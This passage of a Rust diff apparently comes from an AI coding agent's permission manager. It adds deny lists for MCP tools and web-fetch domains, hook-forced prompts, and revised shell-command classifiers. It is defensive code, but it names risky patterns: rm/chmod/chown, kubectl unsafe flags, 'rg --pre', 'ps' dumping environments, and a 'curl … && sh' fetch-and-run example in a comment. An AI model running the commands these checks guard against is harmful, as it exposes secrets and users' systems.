@@ -25,15 +25,13 @@ use crate::permission::gate_preflight::GatePreflight;
 use crate::permission::policy::{CompiledPolicy, ShellWord};
 use crate::permission::prompter::{AcpPrompter, PromptOutcome, PromptOutcomeKind};
 use crate::permission::shell_access::{
-    command_write_paths_in_tree, edit_target_protection, is_safe_write_sink, tree_has_opaque_shell,
-    words_are_opaque_shell,
+    command_write_paths_split, edit_target_protection, is_creation_program, is_safe_write_sink,
+    script_has_cwd_change, tree_has_opaque_shell, words_are_opaque_shell,
 };
-use crate::permission::state::{
-    PermissionState, load_state_from_disk, persist_state, replace_state_on_disk,
-};
+use crate::permission::state::{PermissionState, persist_state, replace_state_on_disk};
 use crate::permission::types::{
     AccessKind, ClientType, Decision, EditPolicy, PermissionCommand, PermissionEvent,
-    PermissionResolution, PermissionRule, PromptPolicy, RequestPathContext,
+    PermissionRequest, PermissionResolution, PermissionRule, PromptPolicy, RequestPathContext,
 };
 use xai_grok_mcp::servers::parse_mcp_qualified_name;
 use xai_grok_paths::AbsPathBuf;
@@ -120,6 +118,12 @@ fn mcp_pre_decision(
     policy_forced_prompt: bool,
     remember_tool_approvals: bool,
 ) -> Option<Decision> {
+    if state.disallowed_mcp_tools.contains(name) {
+        tracing::debug!(%name, source = "session_denylist_tool", "MCP tool auto-rejected");
+        return Some(Decision::Reject(format!(
+            "User previously rejected `{name}` in this project"
+        )));
+    }
     if policy_forced_prompt && !remember_tool_approvals {
         return None;
     }
@@ -151,8 +155,47 @@ fn mcp_pre_decision(
 ///
 /// Deliberately does **not** match `--pre-glob`, which only filters when a
 /// preprocessor runs and does not itself spawn processes.
+pub(crate) fn web_fetch_deny_key(host: &str) -> String {
+    host.trim().trim_end_matches('.').to_lowercase()
+}
+
+pub(crate) fn web_fetch_deny_key_from_url(url: &str) -> Option<String> {
+    let key = web_fetch_deny_key(url::Url::parse(url).ok()?.host_str()?);
+    (!key.is_empty()).then_some(key)
+}
+
+fn denied_web_fetch_domain<'a>(host: &str, disallowed: &'a HashSet<String>) -> Option<&'a str> {
+    if disallowed.is_empty() {
+        return None;
+    }
+    let domain = web_fetch_deny_key(host);
+    disallowed
+        .iter()
+        .find(|denied| {
+            !denied.is_empty()
+                && (domain == **denied
+                    || (domain.len() > denied.len() + 1
+                        && domain.ends_with(denied.as_str())
+                        && domain.as_bytes()[domain.len() - denied.len() - 1] == b'.'))
+        })
+        .map(String::as_str)
+}
+
+fn web_fetch_deny_pre_decision(parsed_url: &url::Url, state: &PermissionState) -> Option<Decision> {
+    let denied =
+        denied_web_fetch_domain(parsed_url.host_str()?, &state.disallowed_web_fetch_domains)?;
+    tracing::debug!(
+        url = %parsed_url,
+        %denied,
+        source = "session_denylist",
+        "web_fetch domain auto-rejected"
+    );
+    Some(Decision::Reject(format!(
+        "User previously rejected `{denied}` in this project"
+    )))
+}
 fn rg_has_pre_flag(words: &[String]) -> bool {
-    if words.first().map(String::as_str) != Some("rg") {
+    if crate::permission::policy::normalized_command_head(words).as_deref() != Some("rg") {
         return false;
     }
     words
@@ -170,7 +213,7 @@ fn rg_has_pre_flag(words: &[String]) -> bool {
 /// (nor a broader whitelist *prefix* grant — see `evaluate_bash`). Flag list is
 /// [`KUBECTL_UNSAFE_FLAGS`] so the two classifiers cannot drift.
 fn kubectl_has_unsafe_flag(words: &[String]) -> bool {
-    if words.first().map(String::as_str) != Some("kubectl") {
+    if crate::permission::policy::normalized_command_head(words).as_deref() != Some("kubectl") {
         return false;
     }
     words.iter().skip(1).any(|w| {
@@ -191,7 +234,7 @@ fn kubectl_has_unsafe_flag(words: &[String]) -> bool {
 /// Value operands of format/select flags (`-o etime`, `o command`,
 /// `-eo pid,cmd`) are skipped so they are not mistaken for option clusters.
 fn ps_dumps_environment(words: &[String]) -> bool {
-    if words.first().map(String::as_str) != Some("ps") {
+    if crate::permission::policy::normalized_command_head(words).as_deref() != Some("ps") {
         return false;
     }
     let mut skip_next = false;
@@ -334,6 +377,8 @@ fn is_safe_command_words_str(cmd: &str) -> bool {
     //
     // `rg --pre` is excluded at the words level via [`rg_has_pre_flag`] — the
     // string form here cannot see flag structure reliably after join.
+        || matches_command_prefix(cmd, "echo")
+        || matches_command_prefix(cmd, "printf")
 }
 
 /// Commands which are always safe to execute and should never prompt the user.
@@ -368,6 +413,12 @@ const ALWAYS_SAFE_COMMANDS: &[&str] = &[
 /// auto-approve via the always-safe primary alone — every non-setup segment
 /// must independently pass this (or the broader `is_safe_command_words`,
 /// or a user whitelist) check.
+fn is_safe_creation_command(words: &[String]) -> bool {
+    words
+        .first()
+        .map(String::as_str)
+        .is_some_and(is_creation_program)
+}
 fn is_always_safe_command_words(words: &[String]) -> bool {
     if words.is_empty() {
         return false;
@@ -410,7 +461,9 @@ fn is_always_safe_command_words(words: &[String]) -> bool {
 /// offered default scope is never below the minimum and the two cannot drift
 /// (see [`always_allow_scope_persists`], the predicate the prompt arrows use).
 fn always_allow_scope_pinned(words: &[String]) -> bool {
-    is_dangerous_command_words(words) || crate::permission::policy::head_is_exec_vehicle(words)
+    is_dangerous_command_words(words)
+        || crate::permission::policy::head_is_exec_vehicle(words)
+        || crate::permission::policy::normalized_command_head(words).as_deref() == Some("sed")
 }
 
 /// Default always-allow whitelist scope (word count) for a parsed command.
@@ -437,7 +490,20 @@ pub fn default_always_allow_scope(words: &[String]) -> usize {
     if always_allow_scope_pinned(words) {
         return words.len();
     }
+    if let Some(n) = gh_always_allow_scope(words) {
+        return n;
+    }
     base_scope(words)
+}
+
+fn gh_always_allow_scope(words: &[String]) -> Option<usize> {
+    if crate::permission::policy::normalized_command_head(words).as_deref() != Some("gh") {
+        return None;
+    }
+    Some(match (words.get(1), words.get(2)) {
+        (Some(group), Some(verb)) if !group.starts_with('-') && !verb.starts_with('-') => 3,
+        _ => words.len(),
+    })
 }
 
 /// Default "Never allow" scope (word count) for a parsed command. Denies
@@ -475,10 +541,9 @@ fn base_scope(words: &[String]) -> usize {
 /// Deny scopes are not pinned (see [`default_always_deny_scope`]).
 pub fn minimum_always_allow_scope(words: &[String]) -> usize {
     if always_allow_scope_pinned(words) {
-        words.len()
-    } else {
-        1
+        return words.len();
     }
+    gh_always_allow_scope(words).unwrap_or(1)
 }
 
 /// Check whether parsed command words begin with a known dangerous command.
@@ -489,10 +554,14 @@ pub fn minimum_always_allow_scope(words: &[String]) -> usize {
 /// `is_dangerous_command` script-level check, but applied to every
 /// segment in a chain instead of only the start of the script.
 fn is_dangerous_command_words(words: &[String]) -> bool {
-    if words.is_empty() {
+    let Some(head) = crate::permission::policy::normalized_command_head(words) else {
         return false;
-    }
-    let joined = words.join(" ");
+    };
+    let joined = if words.len() == 1 {
+        head
+    } else {
+        format!("{head} {}", words[1..].join(" "))
+    };
     matches_command_prefix(&joined, "rm")
         || matches_command_prefix(&joined, "chmod")
         || matches_command_prefix(&joined, "chown")
@@ -550,7 +619,10 @@ struct BashEvaluation {
     /// evidence. `ExecOrAmbientGit` may be added later by the ambient git scan.
     assessment: BashSecurityAssessment,
     /// Raw segment word lists for ambient cwd tracking (git present, flags clean).
+    redirect_write: bool,
     ambient_segments: Option<Vec<Vec<String>>>,
+    creation_paths: Vec<String>,
+    has_cwd_change: bool,
 }
 
 fn unparseable_exec_risk(cmd: &str) -> bool {
@@ -600,12 +672,24 @@ fn evaluate_bash(cmd: &str, state: &PermissionState, honor_safe_lists: bool) -> 
             exact_grant,
             all_segments_granted: false,
             assessment,
+            redirect_write: true,
             ambient_segments: None,
+            creation_paths: Vec::new(),
+            has_cwd_change: false,
         };
     };
-    if command_write_paths_in_tree(tree.root_node(), cmd)
-        .into_iter()
-        .any(|path| !is_safe_write_sink(&path))
+    let writes = command_write_paths_split(tree.root_node(), cmd);
+    let has_cwd_change = script_has_cwd_change(tree.root_node(), cmd);
+    let redirect_write = writes.unextracted_write_redirect
+        || writes
+            .redirect_paths
+            .iter()
+            .any(|path| !is_safe_write_sink(path));
+    if redirect_write
+        || writes
+            .word_paths
+            .iter()
+            .any(|path| !is_safe_write_sink(path))
     {
         assessment.insert(Finding::FileWrite);
     }
@@ -631,7 +715,10 @@ fn evaluate_bash(cmd: &str, state: &PermissionState, honor_safe_lists: bool) -> 
             exact_grant,
             all_segments_granted: false,
             assessment,
+            redirect_write: true,
             ambient_segments: None,
+            creation_paths: Vec::new(),
+            has_cwd_change: false,
         };
     };
     // Upgrade the raw-string compare with the dequoted single-command form now
@@ -682,7 +769,10 @@ fn evaluate_bash(cmd: &str, state: &PermissionState, honor_safe_lists: bool) -> 
                 exact_grant,
                 all_segments_granted,
                 assessment: std::mem::take(&mut assessment),
+                redirect_write,
                 ambient_segments: None,
+                creation_paths: Vec::new(),
+                has_cwd_change: false,
             };
         }
 
@@ -692,7 +782,7 @@ fn evaluate_bash(cmd: &str, state: &PermissionState, honor_safe_lists: bool) -> 
         // that key only on the exact segment — `docker run nginx` must not
         // match `docker run nginx --privileged`. Dangerous verbs get the
         // stronger rule 2 below.
-        let matched_command_grant = if crate::permission::policy::head_is_exec_vehicle(words) {
+        let matched_command_grant = if always_allow_scope_pinned(words) {
             state.allowed_bash_commands.contains(s.as_str())
         } else {
             state
@@ -739,7 +829,9 @@ fn evaluate_bash(cmd: &str, state: &PermissionState, honor_safe_lists: bool) -> 
         // 3. Auto-allow conditions. Built-in safe lists count only when
         //    `honor_safe_lists` is set; an explicit user grant always counts.
         let matched_safe = honor_safe_lists
-            && (is_safe_command_words(words) || is_always_safe_command_words(words));
+            && (is_safe_command_words(words)
+                || is_always_safe_command_words(words)
+                || is_safe_creation_command(words));
         if matched_grant || matched_safe {
             if matched_grant {
                 via_session_grant = true;
@@ -767,7 +859,10 @@ fn evaluate_bash(cmd: &str, state: &PermissionState, honor_safe_lists: bool) -> 
         exact_grant,
         all_segments_granted,
         assessment,
+        redirect_write,
         ambient_segments,
+        creation_paths: writes.creation_paths,
+        has_cwd_change,
     }
 }
 
@@ -1053,11 +1148,32 @@ impl PermissionHandle {
         subagent_type: Option<String>,
         subagent_description: Option<String>,
     ) -> PermissionResolution {
+        self.request_with_context(PermissionRequest {
+            access,
+            tool_call_update,
+            path_context,
+            session_id,
+            subagent_type,
+            subagent_description,
+            hook_ask: None,
+        })
+        .await
+    }
+
+    pub async fn request_with_context(&self, request: PermissionRequest) -> PermissionResolution {
         match self {
-            PermissionHandle::AllowAll => PermissionResolution {
-                decision: Decision::Allow,
-                event: None,
-            },
+            PermissionHandle::AllowAll => {
+                if let Some(ask) = &request.hook_ask {
+                    tracing::debug!(
+                        hook_name = %ask.hook_name,
+                        "hook ask dropped: this permission handle cannot prompt"
+                    );
+                }
+                PermissionResolution {
+                    decision: Decision::Allow,
+                    event: None,
+                }
+            }
             PermissionHandle::Actor {
                 cmd_tx, in_flight, ..
             } => {
@@ -1066,13 +1182,8 @@ impl PermissionHandle {
                 let _in_flight_guard = InFlightGuard::new(in_flight);
                 let (tx, rx) = oneshot::channel::<PermissionResolution>();
                 let msg = PermissionCommand::Request {
-                    access,
-                    tool_call_update,
-                    path_context,
+                    request,
                     respond_to: tx,
-                    session_id,
-                    subagent_type,
-                    subagent_description,
                 };
                 if let Err(e) = cmd_tx.send(msg) {
                     tracing::error!(?e, "failed to send permission request");
@@ -1142,6 +1253,15 @@ fn persisted_bash_auto_allows(
 /// [`BashSecurityAssessment`] — no re-derivation of per-effect fields.
 fn bash_request_floor_requires_prompt(evaluation: Option<&BashEvaluation>) -> bool {
     evaluation.is_some_and(|e| !e.exact_grant && e.assessment.constrains_broad_grant())
+}
+
+fn narrow_allow_clears_write_floor(
+    evaluation: Option<&BashEvaluation>,
+    policy: Option<&CompiledPolicy>,
+    access: &AccessKind,
+) -> bool {
+    evaluation.is_some_and(|e| e.assessment.is_file_write_only() && !e.redirect_write)
+        && policy.is_some_and(|p| p.narrow_allow_authorizes(access))
 }
 
 /// A request has no static-analysis findings at all — the only case where a
@@ -1280,13 +1400,21 @@ fn session_grant_pre_decision(
     yolo_pin: Option<&'static str>,
 ) -> Option<(Decision, &'static str)> {
     match access {
-        AccessKind::MCPTool { name, .. } => {
-            mcp_pre_decision(name, state, false, false).map(|d| (d, reasons::SESSION_GRANT))
-        }
+        AccessKind::MCPTool { name, .. } => mcp_pre_decision(name, state, false, false).map(|d| {
+            let reason = if matches!(d, Decision::Reject(_)) {
+                reasons::SESSION_DENY
+            } else {
+                reasons::SESSION_GRANT
+            };
+            (d, reason)
+        }),
         AccessKind::WebFetch(url) => {
             let Ok(parsed_url) = url::Url::parse(url) else {
                 return None;
             };
+            if let Some(reject) = web_fetch_deny_pre_decision(&parsed_url, state) {
+                return Some((reject, reasons::SESSION_DENY));
+            }
             if honor_static_web_allowlist && static_domain_matcher.check(&parsed_url).is_none() {
                 return grant_allow(reasons::STATIC_ALLOWLIST);
             }
@@ -1308,7 +1436,8 @@ fn session_grant_pre_decision(
         AccessKind::Read(_)
         | AccessKind::Grep { .. }
         | AccessKind::WebSearch(_)
-        | AccessKind::Edit(_) => None,
+        | AccessKind::Edit(_)
+        | AccessKind::AgentMessage { .. } => None,
     }
 }
 
@@ -1436,7 +1565,8 @@ fn spawn_permission_manager_with_pin(
 
     let _task = tokio::task::spawn_local(async move {
         let client_id_ref = client_identifier.as_deref();
-        let mut state = load_state_from_disk(&cwd, client_id_ref).await;
+        let (mut store, mut state) =
+            crate::permission::state::CachedStateStore::resolve_and_load(&cwd, client_id_ref).await;
 
         // One-time migration for users who previously selected
         // "Yes, allow all edits during this session".
@@ -1585,13 +1715,17 @@ fn spawn_permission_manager_with_pin(
                     );
                 }
                 PermissionCommand::Request {
-                    access,
-                    tool_call_update,
-                    path_context,
+                    request:
+                        PermissionRequest {
+                            access,
+                            tool_call_update,
+                            path_context,
+                            session_id: request_session_id,
+                            subagent_type: request_subagent_type,
+                            subagent_description: request_subagent_description,
+                            hook_ask,
+                        },
                     mut respond_to,
-                    session_id: request_session_id,
-                    subagent_type: request_subagent_type,
-                    subagent_description: request_subagent_description,
                 } => {
                     // wait_ms timer; starts at dequeue so it excludes time queued behind others.
                     let request_received = std::time::Instant::now();
@@ -1637,6 +1771,9 @@ fn spawn_permission_manager_with_pin(
                         AccessKind::WebFetch(url) => ("web_fetch".to_owned(), Some(url.clone())),
                         AccessKind::WebSearch(query) => {
                             ("web_search".to_owned(), Some(query.clone()))
+                        }
+                        AccessKind::AgentMessage { subagent_id } => {
+                            ("agent_message".to_owned(), Some(subagent_id.clone()))
                         }
                     };
 
@@ -1708,6 +1845,7 @@ fn spawn_permission_manager_with_pin(
                             classifier_verdict: classification
                                 .classifier_verdict()
                                 .map(|v| v.wire_str().to_owned()),
+                            remember_tool_approvals: Some(remember_tool_approvals),
                         };
                         // Exactly one clone to the trace receiver; the identical
                         // event is returned to the requester via the resolution.
@@ -1725,6 +1863,14 @@ fn spawn_permission_manager_with_pin(
                             Some(reasons::REQUESTER_GONE),
                         );
                         continue;
+                    }
+
+                    if matches!(
+                        &access,
+                        AccessKind::Bash(_) | AccessKind::MCPTool { .. } | AccessKind::WebFetch(_)
+                    ) && let Some(fresh) = store.reload_if_changed().await
+                    {
+                        state.merge_grants_from(fresh);
                     }
 
                     let bash_evaluation = match &access {
@@ -1783,6 +1929,28 @@ fn spawn_permission_manager_with_pin(
                             let resolved = resolve_model_path(cwd.as_path(), None, path);
                             edit_target_protection(&resolved)
                         }
+                        (AccessKind::Bash(_), context) => bash_evaluation.as_ref().and_then(|e| {
+                            if e.has_cwd_change
+                                && e.creation_paths
+                                    .iter()
+                                    .any(|p| !std::path::Path::new(p).is_absolute())
+                            {
+                                return Some(
+                                    crate::permission::shell_access::ProtectedEditReason::Sensitive,
+                                );
+                            }
+                            e.creation_paths.iter().find_map(|path| {
+                                let resolved = match context {
+                                    Some(ctx) => resolve_model_path(
+                                        &ctx.real_cwd,
+                                        ctx.display_cwd.as_deref(),
+                                        path,
+                                    ),
+                                    None => resolve_model_path(cwd.as_path(), None, path),
+                                };
+                                edit_target_protection(&resolved)
+                            })
+                        }),
                         _ => None,
                     };
 
@@ -1804,6 +1972,9 @@ fn spawn_permission_manager_with_pin(
                     // Set when auto mode decides to prompt (needs-user fast path or
                     // classifier block). Prevents the sandbox bash auto-approve and the
                     // allowlist pre-decision below from silently overriding it.
+                    let hook_forced_prompt = hook_ask.is_some();
+                    let pre_classifier_forced_prompt =
+                        policy_forced_prompt || shell_forced_prompt || hook_forced_prompt;
                     let mut auto_forced_prompt = false;
                     // Auto-mode reason a prompt was forced, so the prompt-path event
                     // records why it reached the user.
@@ -1825,7 +1996,7 @@ fn spawn_permission_manager_with_pin(
                         continue;
                     }
 
-                    if yolo_mode && !shell_forced_prompt {
+                    if yolo_mode && !shell_forced_prompt && !hook_forced_prompt {
                         tracing::debug!("YOLO mode: auto-approving permission request");
                         let decision = Decision::Allow;
                         let event = emit_event(&decision, true, false, None, Some(reasons::YOLO));
@@ -1838,8 +2009,7 @@ fn spawn_permission_manager_with_pin(
 
                     // Session always-allow grants win before the auto classifier.
                     // Ask floors fall through so managed Ask / shell-file Ask stay binding.
-                    if !policy_forced_prompt
-                        && !shell_forced_prompt
+                    if !pre_classifier_forced_prompt
                         && protected_edit.is_none()
                         && let Some((decision, reason)) = session_grant_pre_decision(
                             &access,
@@ -1873,8 +2043,7 @@ fn spawn_permission_manager_with_pin(
                     // and boundaries on `narrow_allow_authorizes`. That walk
                     // re-parses the script, so it runs only when findings exist.
                     if auto_mode
-                        && !policy_forced_prompt
-                        && !shell_forced_prompt
+                        && !pre_classifier_forced_prompt
                         && protected_edit.is_none()
                         && matches!(policy_decision, Some(Decision::Allow))
                         && (bash_assessment_is_clear(bash_evaluation.as_ref())
@@ -1912,6 +2081,7 @@ fn spawn_permission_manager_with_pin(
                             || access_requires_user_interaction(&tool_name, &access);
                         let fast = auto_mode_fast_path(&access, &tool_name, needs_user);
                         match fast {
+                            AutoFastPath::Allow if hook_forced_prompt => {}
                             AutoFastPath::Allow => {
                                 *classification.borrow_mut() = RequestClassification::FastPath;
                                 tracing::debug!(
@@ -1976,6 +2146,11 @@ fn spawn_permission_manager_with_pin(
                                         verdict = classify => RouteResult::Completed(verdict),
                                         _ = respond_to.closed() => RouteResult::Abandoned,
                                     }
+                                } else if matches!(&access, AccessKind::AgentMessage { .. }) {
+                                    RouteResult::Completed(
+                                        crate::permission::auto_mode::ClassifierVerdict::Block
+                                            .into(),
+                                    )
                                 } else {
                                     RouteResult::NotWired
                                 };
@@ -2052,19 +2227,31 @@ fn spawn_permission_manager_with_pin(
                                             consecutive: auto_consecutive_denials,
                                             total: auto_total_denials,
                                         });
-                                        let decision = Decision::Allow;
-                                        let event = emit_event(
-                                            &decision,
-                                            true,
-                                            false,
-                                            None,
-                                            Some(reasons::AUTO_CLASSIFIER_ALLOW),
+                                        if !hook_forced_prompt {
+                                            let decision = Decision::Allow;
+                                            let event = emit_event(
+                                                &decision,
+                                                true,
+                                                false,
+                                                None,
+                                                Some(reasons::AUTO_CLASSIFIER_ALLOW),
+                                            );
+                                            let _ = respond_to.send(PermissionResolution {
+                                                decision,
+                                                event: Some(event),
+                                            });
+                                            continue;
+                                        }
+                                    }
+                                    ClassifierVerdict::Block
+                                        if client_type.can_present_permission_prompt() =>
+                                    {
+                                        tracing::info!(
+                                            tool = %tool_name,
+                                            "auto mode: classifier blocked — prompting user"
                                         );
-                                        let _ = respond_to.send(PermissionResolution {
-                                            decision,
-                                            event: Some(event),
-                                        });
-                                        continue;
+                                        auto_forced_prompt = true;
+                                        auto_prompt_reason = Some(reasons::AUTO_CLASSIFIER_DENY);
                                     }
                                     // A classifier Block on any built-in Bash
                                     // finding (or fail-closed gate Ask) follows the
@@ -2152,6 +2339,8 @@ fn spawn_permission_manager_with_pin(
                         )
                         && !policy_forced_prompt
                         && !auto_forced_prompt
+                        && !hook_forced_prompt
+                        && protected_edit.is_none()
                     {
                         tracing::debug!("sandbox: auto-approving bash");
                         let decision = Decision::Allow;
@@ -2183,7 +2372,14 @@ fn spawn_permission_manager_with_pin(
                         Some(Decision::Allow)
                             if protected_edit.is_some()
                                 || auto_forced_prompt
-                                || bash_request_floor_requires_prompt(bash_evaluation.as_ref()) =>
+                                || hook_forced_prompt
+                                || (bash_request_floor_requires_prompt(
+                                    bash_evaluation.as_ref(),
+                                ) && !narrow_allow_clears_write_floor(
+                                    bash_evaluation.as_ref(),
+                                    compiled_policy.as_ref(),
+                                    &access,
+                                )) =>
                         {
                             // Auto forced a prompt (classifier timeout/unavailable/
                             // denial-limit on a findings-bearing command): a broad
@@ -2252,7 +2448,14 @@ fn spawn_permission_manager_with_pin(
                             policy_forced_prompt,
                             remember_tool_approvals,
                         )
-                        .map(|d| (d, reasons::PERSISTED_GRANT)),
+                        .map(|d| {
+                            let reason = if matches!(d, Decision::Reject(_)) {
+                                reasons::SESSION_DENY
+                            } else {
+                                reasons::PERSISTED_GRANT
+                            };
+                            (d, reason)
+                        }),
                         AccessKind::Edit(_) => {
                             if allow_edits_for_session && protected_edit.is_none() {
                                 Some((Decision::Allow, reasons::PERSISTED_GRANT))
@@ -2271,7 +2474,9 @@ fn spawn_permission_manager_with_pin(
                             }
                         }
                         AccessKind::Bash(cmd) => {
-                            if bash_request_floor_requires_prompt(bash_evaluation.as_ref()) {
+                            if protected_edit.is_some()
+                                || bash_request_floor_requires_prompt(bash_evaluation.as_ref())
+                            {
                                 None
                             } else if policy_forced_prompt {
                                 // Ask floor: only explicit grants with remember on.
@@ -2305,59 +2510,77 @@ fn spawn_permission_manager_with_pin(
                                 )
                             }
                         }
-                        AccessKind::WebFetch(url) => {
-                            match url::Url::parse(url) {
-                                Ok(parsed_url) => {
-                                    if static_domain_matcher.check(&parsed_url).is_none() {
+                        AccessKind::AgentMessage { .. } => None,
+                        AccessKind::WebFetch(url) => match url::Url::parse(url) {
+                            Ok(parsed_url) => {
+                                if let Some(reject) =
+                                    web_fetch_deny_pre_decision(&parsed_url, &state)
+                                {
+                                    Some((reject, reasons::SESSION_DENY))
+                                } else if static_domain_matcher.check(&parsed_url).is_none() {
+                                    tracing::debug!(
+                                        url = %url,
+                                        source = "static_allowlist",
+                                        "web_fetch domain auto-approved"
+                                    );
+                                    Some((Decision::Allow, reasons::STATIC_ALLOWLIST))
+                                } else if let Some(host) = parsed_url.host_str() {
+                                    let domain = normalize_domain(host);
+                                    if state.allowed_web_fetch_domains.contains(&domain) {
                                         tracing::debug!(
                                             url = %url,
-                                            source = "static_allowlist",
+                                            %domain,
+                                            source = "session_allowlist",
                                             "web_fetch domain auto-approved"
                                         );
                                         // Built-in static allowlist, not a user-remembered grant.
-                                        Some((Decision::Allow, reasons::STATIC_ALLOWLIST))
-                                    } else if let Some(host) = parsed_url.host_str() {
-                                        let domain = normalize_domain(host);
-                                        if state.allowed_web_fetch_domains.contains(&domain) {
-                                            tracing::debug!(
-                                                url = %url,
-                                                %domain,
-                                                source = "session_allowlist",
-                                                "web_fetch domain auto-approved"
-                                            );
-                                            Some((Decision::Allow, reasons::PERSISTED_GRANT))
-                                        } else {
-                                            tracing::debug!(
-                                                url = %url,
-                                                %domain,
-                                                source = "prompt",
-                                                "web_fetch domain not in allowlist, prompting user"
-                                            );
-                                            None
-                                        }
+                                        Some((Decision::Allow, reasons::PERSISTED_GRANT))
                                     } else {
                                         // No host in URL — prompt user.
+                                        tracing::debug!(
+                                            url = %url,
+                                            %domain,
+                                            source = "prompt",
+                                            "web_fetch domain not in allowlist, prompting user"
+                                        );
                                         None
                                     }
-                                }
-                                Err(e) => {
-                                    tracing::debug!(
-                                        url = %url,
-                                        error = %e,
-                                        "web_fetch URL unparseable, prompting user"
-                                    );
+                                } else {
                                     None
                                 }
                             }
-                        }
+                            Err(e) => {
+                                tracing::debug!(
+                                    url = %url,
+                                    error = %e,
+                                    "web_fetch URL unparseable, prompting user"
+                                );
+                                None
+                            }
+                        },
                     };
                     // Auto forced a prompt: neutralize leftover non-bash Allows.
                     // Session grants already short-circuited; bash grants stay gated
                     // on `!auto_forced_prompt` in `bash_grant_pre_decision`.
+                    let classifier_absent = auto_prompt_reason
+                        == Some(reasons::AUTO_CLASSIFIER_TIMEOUT)
+                        || auto_prompt_reason == Some(reasons::AUTO_CLASSIFIER_UNAVAILABLE);
+                    let webfetch_static_fallback = classifier_absent
+                        && matches!(&access, AccessKind::WebFetch(_))
+                        && matches!(
+                            &pre_decision,
+                            Some((Decision::Allow, reason))
+                                if *reason == reasons::STATIC_ALLOWLIST
+                                    || *reason == reasons::PERSISTED_GRANT
+                        );
                     if auto_forced_prompt
                         && auto_prompt_blocks_allow(&access)
                         && matches!(pre_decision, Some((Decision::Allow, _)))
+                        && !webfetch_static_fallback
                     {
+                        pre_decision = None;
+                    }
+                    if hook_forced_prompt && matches!(pre_decision, Some((Decision::Allow, _))) {
                         pre_decision = None;
                     }
                     // no prompt needed if we have a pre-decision
@@ -2388,21 +2611,40 @@ fn spawn_permission_manager_with_pin(
                     // The preflight owns the policy/gate labels (a deferred Ask that
                     // reached the classifier reports the classifier outcome); the
                     // bash floors are the fallback triggers.
+                    if prompt_policy == crate::permission::types::PromptPolicy::Allow
+                        && !hook_forced_prompt
+                        && !shell_forced_prompt
+                        && yolo_pin.is_none()
+                    {
+                        tracing::info!(
+                            tool = ?tool_name,
+                            "prompt_policy=allow: auto-approved without prompting"
+                        );
+                        let decision = Decision::Allow;
+                        let event =
+                            emit_event(&decision, true, false, None, Some(reasons::PROMPT_ALLOW));
+                        let _ = respond_to.send(PermissionResolution {
+                            decision,
+                            event: Some(event),
+                        });
+                        continue;
+                    }
                     let opaque_floor = bash_evaluation.as_ref().is_some_and(|e| {
                         !e.exact_grant
                             && e.assessment
                                 .contains(ClassifierSecurityFinding::OpaqueShell)
                     });
-                    let prompt_trigger =
-                        preflight
-                            .prompt_trigger(auto_prompt_reason)
-                            .unwrap_or(if opaque_floor {
-                                reasons::OPAQUE_SHELL
-                            } else if bash_request_floor_requires_prompt(bash_evaluation.as_ref()) {
-                                reasons::BASH_REQUEST_FLOOR
-                            } else {
-                                reasons::NEEDS_USER
-                            });
+                    let prompt_trigger = preflight.prompt_trigger(auto_prompt_reason).unwrap_or(
+                        if hook_forced_prompt {
+                            reasons::HOOK_ASK
+                        } else if opaque_floor {
+                            reasons::OPAQUE_SHELL
+                        } else if bash_request_floor_requires_prompt(bash_evaluation.as_ref()) {
+                            reasons::BASH_REQUEST_FLOOR
+                        } else {
+                            reasons::NEEDS_USER
+                        },
+                    );
                     if respond_to.is_closed() {
                         tracing::info!(tool = %tool_name, "permission requester gone; prompt suppressed");
                         emit_event(
@@ -2429,7 +2671,7 @@ fn spawn_permission_manager_with_pin(
                             // (e.g. `curl … && sh` must not become two separate
                             // prompts for `curl …` then `sh`).
                             let prompt_outcome = tokio::select! {
-                                outcome = prompter.request(&access, &tool_call_update, protected_edit) => outcome,
+                                outcome = prompter.request(&access, &tool_call_update, protected_edit, hook_ask.as_ref()) => outcome,
                                 _ = respond_to.closed() => PromptOutcome::Cancelled,
                             };
 
@@ -2496,6 +2738,11 @@ fn spawn_permission_manager_with_pin(
                                         "User rejected the execution and excluded `{prefix}` from future runs in this project"
                                     ))
                                 }
+                                PromptOutcome::RejectAlwaysMcpTool(_)
+                                | PromptOutcome::RejectAlwaysDomain(_) => {
+                                    effective_kind = PromptOutcomeKind::RejectOnce;
+                                    Decision::Reject("User rejected the execution".to_owned())
+                                }
                                 PromptOutcome::Cancelled => Decision::Cancelled,
                                 PromptOutcome::FollowupMessage(msg) => {
                                     Decision::FollowupMessage(msg)
@@ -2511,12 +2758,36 @@ fn spawn_permission_manager_with_pin(
                         _ => {
                             // Non-bash access kinds keep the single-prompt flow.
                             let prompt_outcome = tokio::select! {
-                                outcome = prompter.request(&access, &tool_call_update, protected_edit) => outcome,
+                                outcome = prompter.request(&access, &tool_call_update, protected_edit, hook_ask.as_ref()) => outcome,
                                 _ = respond_to.closed() => PromptOutcome::Cancelled,
                             };
                             // Wire string from the owner projection (never a
                             // literal); the match projects the *effective* kind so
                             // impossible combinations keep their legacy wire value.
+                            let prompt_outcome =
+                                if matches!(&access, AccessKind::AgentMessage { .. }) {
+                                    match prompt_outcome {
+                                        PromptOutcome::AllowOnce
+                                        | PromptOutcome::AllowAlways
+                                        | PromptOutcome::AllowEditsForSession
+                                        | PromptOutcome::AllowAlwaysBashCommand(_)
+                                        | PromptOutcome::AllowAlwaysBashGlob(_)
+                                        | PromptOutcome::AllowAlwaysDomain(_)
+                                        | PromptOutcome::AllowAlwaysMcpTool(_)
+                                        | PromptOutcome::AllowAlwaysMcpServer(_) => {
+                                            PromptOutcome::AllowOnce
+                                        }
+                                        PromptOutcome::RejectOnce
+                                        | PromptOutcome::RejectAlwaysBashCommand(_)
+                                        | PromptOutcome::RejectAlwaysMcpTool(_)
+                                        | PromptOutcome::RejectAlwaysDomain(_) => {
+                                            PromptOutcome::RejectOnce
+                                        }
+                                        other => other,
+                                    }
+                                } else {
+                                    prompt_outcome
+                                };
                             let mut effective_kind = prompt_outcome.kind();
                             let decision = match &prompt_outcome {
                                 PromptOutcome::AllowOnce => Decision::Allow,
@@ -2639,6 +2910,52 @@ fn spawn_permission_manager_with_pin(
                                     // Not reachable for non-bash access; defensive.
                                     Decision::Reject("User rejected the execution".to_owned())
                                 }
+                                PromptOutcome::RejectAlwaysMcpTool(tool_name) => {
+                                    if let AccessKind::MCPTool {
+                                        name: access_name, ..
+                                    } = &access
+                                    {
+                                        if tool_name != access_name {
+                                            tracing::warn!(
+                                                client_supplied = %tool_name,
+                                                access_name = %access_name,
+                                                "RejectAlwaysMcpTool tool_name mismatch; persisting access-kind name"
+                                            );
+                                        }
+                                        state.disallowed_mcp_tools.insert(access_name.clone());
